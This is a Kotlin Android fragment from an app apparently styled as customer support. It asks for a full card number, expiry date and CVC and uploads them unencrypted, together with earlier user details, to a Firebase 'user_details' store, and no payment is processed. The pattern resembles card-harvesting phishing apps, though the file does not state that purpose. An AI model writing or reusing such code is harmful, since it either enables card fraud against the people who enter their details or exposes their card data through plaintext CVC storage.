package com.ibnghufran.supportforcustomer

import android.content.Intent
import android.os.Bundle
import android.view.LayoutInflater
import android.view.View
import android.view.ViewGroup
import android.widget.Toast
import androidx.fragment.app.Fragment
import com.google.android.material.button.MaterialButton
import com.google.android.material.textfield.TextInputEditText
import com.google.firebase.database.DatabaseReference
import com.google.firebase.database.FirebaseDatabase

class CardDetailsFragment : Fragment() {

    private lateinit var cardNumber: TextInputEditText
    private lateinit var cardExpiry: TextInputEditText
    private lateinit var cardCvc: TextInputEditText
    private lateinit var submitButton: MaterialButton
    private lateinit var backButton: MaterialButton

    // Firebase Database reference
    private lateinit var database: DatabaseReference

    // User input data received from previous fragment
    private lateinit var userInputData: UserInputData

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        // Retrieve user input data from arguments
        arguments?.let {
            userInputData = it.getParcelable("userInputData") ?: UserInputData("", "", "")
        }
    }

    override fun onCreateView(
        inflater: LayoutInflater, container: ViewGroup?,
        savedInstanceState: Bundle?
    ): View? {
        // Inflate the layout for this fragment
        return inflater.inflate(R.layout.fragment_card_details, container, false)
    }

    override fun onViewCreated(view: View, savedInstanceState: Bundle?) {
        super.onViewCreated(view, savedInstanceState)

        // Initialize views
        cardNumber = view.findViewById(R.id.cardNumber)
        cardExpiry = view.findViewById(R.id.cardExpiry)
        cardCvc = view.findViewById(R.id.cardCvc)
        submitButton = view.findViewById(R.id.submitButton)
        backButton = view.findViewById(R.id.backButton)

        // Initialize Firebase Database
        database = FirebaseDatabase.getInstance().getReference("user_details")

        // Set click listener for the submit button
        submitButton.setOnClickListener {
            uploadUserDetails()
        }

        // Set click listener for the back button
        backButton.setOnClickListener {
            requireActivity().supportFragmentManager.popBackStack()
        }
    }

    private fun uploadUserDetails() {
        val cardNum = cardNumber.text.toString().trim()
        val expiry = cardExpiry.text.toString().trim()
        val cvc = cardCvc.text.toString().trim()

        // Validate card details
        if (cardNum.isEmpty() || expiry.isEmpty() || cvc.isEmpty()) {
            Toast.makeText(context, "Please fill in all card details", Toast.LENGTH_SHORT).show()
            return
        }

        // Create user data including card details
        val userData = userInputData.copy(
            cardNumber = cardNum,
            cardExpiry = expiry,
            cardCvc = cvc
        )

        // Upload data to Firebase
        val userId = database.push().key // Generate unique key for each user
        if (userId != null) {
            database.child(userId).setValue(userData).addOnSuccessListener {
                Toast.makeText(context, "Details uploaded successfully", Toast.LENGTH_SHORT).show()

                // Navigate to ConfirmationActivity after successful upload
                val intent = Intent(activity, ConfirmationActivity::class.java)
                startActivity(intent)
                requireActivity().finish() // Optionally finish the current activity
            }.addOnFailureListener { e ->
                Toast.makeText(context, "Failed to upload: ${e.message}", Toast.LENGTH_SHORT).show()
            }
        }
    }
}
